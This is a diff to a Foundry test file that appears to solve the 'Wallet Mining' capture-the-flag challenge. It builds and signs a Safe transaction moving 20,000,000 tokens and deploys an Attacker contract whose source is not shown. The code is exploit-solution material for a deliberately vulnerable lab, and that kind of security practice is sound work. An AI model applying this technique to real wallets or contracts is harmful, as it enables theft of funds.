@@ -24,6 +24,7 @@ import {
     SAFE_SINGLETON_FACTORY_ADDRESS,
     SAFE_SINGLETON_FACTORY_CODE
 } from "./SafeSingletonFactory.sol";
+import {Attacker} from "./Attacker.sol";
 
 contract WalletMiningChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -157,7 +158,12 @@ contract WalletMiningChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_walletMining() public checkSolvedByPlayer {
-        
+        bytes32 DOMAIN_SEPARATOR = keccak256(abi.encode(bytes32(0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218), block.chainid, USER_DEPOSIT_ADDRESS));
+        bytes memory txHashData = abi.encodePacked(bytes1(0x19), bytes1(0x01), DOMAIN_SEPARATOR, keccak256(abi.encode(bytes32(0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8), address(token), 0, keccak256(abi.encodeCall(token.transfer, (user, 20_000_000e18))), 
+                                    Enum.Operation.Call, 50000, 0, 0, address(0), payable(0), 0)));
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, keccak256(txHashData));
+        bytes memory signatures = abi.encodePacked(r, s, v);
+        new Attacker(authorizer, walletDeployer, token, signatures, user, ward);   
     }
 
     /**
